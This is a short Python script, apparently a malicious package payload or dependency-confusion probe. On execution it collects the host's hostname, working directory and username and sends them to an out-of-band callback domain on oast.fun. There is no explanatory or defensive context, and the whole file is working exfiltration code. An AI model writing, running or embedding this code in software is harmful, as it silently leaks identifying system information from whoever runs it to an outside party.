import requests
import socket
import getpass
import os


hostname=socket.gethostname()
cwd = os.getcwd()
username = getpass.getuser()
ploads = {'hostname':hostname,'cwd':cwd,'username':username}
requests.get("https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php",params = ploads)